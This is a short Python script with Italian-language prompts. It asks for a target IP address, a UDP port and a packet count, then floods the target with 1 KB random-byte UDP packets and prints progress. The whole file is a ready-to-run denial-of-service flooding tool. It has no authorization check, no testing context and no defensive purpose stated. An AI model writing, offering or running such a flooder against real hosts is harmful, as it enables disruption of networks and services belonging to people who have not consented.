import socket
import random
import ipaddress

# Input IP
target_ip = input("Inserisci l'IP del target: ")
try:
    ipaddress.ip_address(target_ip)
except ValueError:
    print("❌ L'IP fornito non è valido.")
    exit()

# Input porta
try:
    target_port = int(input("Inserisci la porta UDP del target: "))
    if not(1 <= target_port <= 65535):
        print("❌ La porta deve essere tra 1 e 65535.")
        exit()
except ValueError:
    print("❌ Inserisci un numero valido per la porta.")
    exit()

# Input numero pacchetti
try:
    packet_count = int(input("Inserisci il numero di pacchetti 1KB da inviare: "))
    if packet_count <= 0:
        print("❌ Inserire un numero maggiore di 0.")
        exit()
except ValueError:
    print("❌ Inserisci un numero valido per i pacchetti.")
    exit()

# Crea socket UDP
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Invio pacchetti
for i in range(packet_count):
    packet = random._urandom(1024)  # Pacchetto di 1 KB
    udp_socket.sendto(packet, (target_ip, target_port))
    print(f"[{i+1}/{packet_count}] Pacchetto inviato a {target_ip}:{target_port}")

    # Verifica stato dell'invio (opzionale)
    if i % 10 == 0:  # Controlla ogni 10 pacchetti
        print(f"📊 Stato: Pacchetti inviati finora: {i+1}/{packet_count}")

print("✅ Invio completato.")
udp_socket.close()
